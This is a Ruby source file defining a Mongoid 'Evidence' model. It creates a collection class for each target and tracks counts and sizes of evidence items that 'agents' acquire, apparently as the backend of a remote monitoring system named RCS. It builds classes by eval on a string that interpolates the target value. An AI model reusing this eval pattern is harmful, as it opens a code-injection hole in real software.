require 'mongoid'

#module RCS
#module DB

class Evidence

  def self.collection_name(target)
    "evidence.#{target}"
  end

  def self.collection_class(target)

    classDefinition = <<-END
      class Evidence_#{target}
        include Mongoid::Document

        field :acquired, type: Integer
        field :received, type: Integer
        field :type, type: String
        field :relevance, type: Integer
        field :blotter, type: Boolean
        field :note, type: String
        field :item, type: Array         # agent BSON_ID
        field :data, type: Hash
    
        store_in Evidence.collection_name('#{target}')

        after_create :create_callback, :create_collection_callback
        after_destroy :destroy_callback

        index :type, :acquired
        shard_key :type, :acquired

        STAT_EXCLUSION = ['info', 'filesystem']

        protected
        def create_collection_callback
          db = Mongoid.database
          collection = db.collection('#{Evidence.collection_name(target)}')
          # enable sharding only if not enabled
          RCS::DB::Shard.set_key(collection, {type: 1, acquired: 1}) unless collection.stats['sharded']
        end

        def create_callback
          return if STAT_EXCLUSION.include? self.type
          agent = Item.find self.item.first
          agent.stat.evidence ||= {}
          agent.stat.evidence[self.type] ||= 0
          agent.stat.evidence[self.type] += 1
          agent.stat.size += self.data[:_grid_size] unless self.data[:_grid].nil?
          agent.stat.size += Mongoid.database.collection("#{Evidence.collection_name(target)}").stats()['avgObjSize'].to_i
          agent.stat.grid_size += self.data[:_grid_size] unless self.data[:_grid].nil?
          agent.save
        end

        def destroy_callback
          return if STAT_EXCLUSION.include? self.type
          agent = Item.find self.item.first
          agent.stat.evidence ||= {}
          agent.stat.evidence[self.type] ||= 0
          agent.stat.evidence[self.type] -= 1
          agent.stat.size -= self.data[:_grid_size] unless self.data[:_grid].nil?
          agent.stat.size -= Mongoid.database.collection("#{Evidence.collection_name(target)}").stats()['avgObjSize'].to_i
          agent.stat.grid_size -= self.data[:_grid_size] unless self.data[:_grid].nil?
          agent.save
          
          # drop the file (if any) in grid
          GridFS.instance.delete self.data[:_grid].first unless self.data[:_grid].nil?
        end
      end
    END
    
    classname = "Evidence_#{target}"
    
    if self.const_defined? classname.to_sym
      klass = eval classname
    else
      eval classDefinition
      klass = eval classname
    end
    
    return klass
  end

  def self.dynamic_new(id)
    klass = self.collection_class(id)
    return klass.new
  end

end

#end # ::DB
#end # ::RCS